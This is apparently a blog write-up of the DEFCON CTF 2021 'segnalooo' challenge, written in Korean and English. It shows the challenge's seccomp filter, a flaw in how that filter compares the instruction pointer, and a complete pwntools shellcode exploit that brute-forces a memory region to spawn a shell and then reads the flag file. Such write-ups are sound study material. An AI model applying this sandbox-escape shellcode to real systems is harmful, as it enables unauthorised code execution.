---
layout: post
title: DEFCON CTF 2021 segnalooo write-up
categories: ctf-write-up
tag: [ctf]
---

## segnalooo (20solves)

나는 이 문제를 처음부터 보지 않았다. 팀원(epist, mhibio)이 먼저 진행하고 있었고, 원하는 셸 코드를 실행 할 수 있는 상황이었다.

I joined this chall a little late. My team members(epist, mhibio) were working on it first and was able to execute shell code.

```python
context.log_level = 'debug'
p = process('./stub.bin')
payload = p8(0xf1)
payload += asm(f'''
    mov eax, 0
    syscall
''')
print(disasm(payload))
p.sendlineafter("Give me some code!\n", payload.hex())
p.interactive()
```

위와 같은 코드가 작성된 시점에서 이 문제에 합류 했으며, 나는 소스코드 분석은 하지 않았다. 

I joined this chall at the time the above code was written and I did not do source code analysis.



seccomp는 다음과 같다.

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x08 0x00 0x40000000  if (A >= 0x40000000) goto 0012
 0004: 0x15 0x06 0x00 0x0000000b  if (A == munmap) goto 0011
 0005: 0x15 0x05 0x00 0x00000023  if (A == nanosleep) goto 0011
 0006: 0x20 0x00 0x00 0x00000008  A = instruction_pointer
 0007: 0x25 0x04 0x00 0x80000000  if (A > 0x80000000) goto 0012
 0008: 0x20 0x00 0x00 0x00000000  A = sys_number
 0009: 0x15 0x02 0x01 0x0000003b  if (A == execve) goto 0012 else goto 0011
 0010: 0x06 0x00 0x00 0x00000000  return KILL
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

`munmap`과 `nanosleep`을 사용할 수 있고 **RIP가 0x80000000 이하일 때 execve를 제외한 모든 syscall을 사용할 수 있다.**

We can use `munmap` and `nanosleep`. and **When RIP is below 0x80000000, we can use all syscalls except execve.**



shellcode를 실행하는 시점의 메모리는 다음과 같다.

The memory at the time shellcode is executed is as follows.

![image](https://user-images.githubusercontent.com/43925259/116833821-443bb400-abf6-11eb-8b4e-c1e45f23b863.png)

우리의 셸 코드는 0x5xxxxxxxxxxx 영역에서 실행되고 0x10xxxxxxxxxx영역엔 셸 코드를 실행하기 이전에 레지스터를 초기화하는 등 다양한 작업을 하는 영역이다. 나머지 메모리들은 모두 munmap되어 있다.

Our shell code runs in the 0x5xxxxxxxxxxx region, and the 0x10xxxxxxxxxx region is an area that does various tasks, such as initializing registers before executing shellcode.



일단 무슨 짓을 해도 현재 메모리 영역에선 munmap과 nanosleep밖에 사용할 수 없어서 디버깅을 통해 0x10xxxxxxxxxx영역으로 jmp를 해서 다른 syscall을 실행해보았는데 성공적으로 실행되는 것을 확인했다. 아마 RIP를 비교할 때 4byte만 비교해서 발생하는 현상이다.

When comparing RIP, only 4 bytes are compared, so 0x10xxxxxxxxxx region allows other syscalls to be executed.



이를 통해 0x10xxxxxxxxxx 영역의 주소만 알 수 있으면 레지스터를 세팅후 0x10xxxxxxxxxx영역에 존재하는 syscall 부분으로 jmp를 하여 원하는 syscall을 호출 할 수 있다. 

We can call any syscall by leaking only 0x10xxxxxxxxxx region.



이제 저 주소를 어떻게 알아내냐인데, 내가 첫 번째 떠올린 아이디어는 munmap을 이용한 브루트포싱이다. 정상적인 주소를 munmap 했을 땐 0이 리턴되고 비정상적인 경우 음수를 리턴하는 루틴을 사용할려했는데, 비정상적인 주소를 munmap 했을 때도 0을 반환하는 현상이 발생하여 다른 방법을 생각했다.

My first idea is brute-forcing using a munmap. I expected to return 0 when I put in a normal address and negative when I put in an abnormal address. But in any case, it returned zero.



두 번째로 떠올린 아이디어는 nanosleep을 이용한 브루트포싱이다. nanosleep의 첫 번째 인자가 구조체인데, 이 첫 번째 인자에 invalid한 주소를 넣으면 0xfffffffffffffff2를 리턴하고 valid한 주소를 넣으면 0xffffffffffffffea를 리턴한다는 동작을 이용했다. 따라서 다음과 같은 동작을 하는 셸 코드를 작성하면 문제가 풀릴 것으로 예상했다.

My second idea is brute-forcing using a nanosleep. The first argument in this syscall is the structure. It returns 0xfffffffffffffff2 when the first argument is an invalid address. but It returns 0xffffffffffffffea when the first argument is an valid address. So I thought I could write the following shell code.

```c
for (i = 0; i <= 0xfffffff; i++)
    if (syscall(35, (0x10 << 40) + (i << 12), 0) == -22)
        call execveat (set register and jmp (0x10 << 40) + (i << 12) + 0xb4 )
```



셸 코드 작성은 @epist가 완료했고 최종 페이로드는 다음과 같다.

Shellcode was written by the epist.

```python
from pwn import *

context(arch='amd64', os='linux')

context.log_level = 'debug'
#p = remote('segnalooo.challenges.ooo', 4321)
p = process('./stub')
payload = p8(0xf1)
payload += asm('''
    mov rdi, 0x1010101000d4
    loop:
    add rdi, 0x1000
    xor eax, eax
    mov al, 35
    syscall
    cmp al, 0
    jne loop

    sub rdi, 0x1000
    xchg rdi, r12
    lea rsi, [rsp-7]
    
    pop rax
    mov al, 0x42
    jmp r12
''')
payload += ((0x31-len(payload))*b'\x00') + b'/bin/sh\x00'

print(disasm(payload))
p.sendlineafter("Give me some code!\n", payload.hex())
p.interactive()
```



셸을 딴 후 ls나 cat 명령들을 사용하면 Bad system call 이라고 뜨면서 프로그램이 종료된다. execve syscall을 사용못하게 해놔서 그런데 이는 다음과 같은 bash command를 이용하여 우회할 수 있다.

After executing the /bin/sh command, using the ls or cat commands results in an error called "Bad system call". I read the flag using bash command because I can't use execve syscall.

```bash
while read line;do echo "$line";done < /flag
```

![image](https://user-images.githubusercontent.com/43925259/116834473-42bfbb00-abf9-11eb-892c-94ba7d0245c5.png)

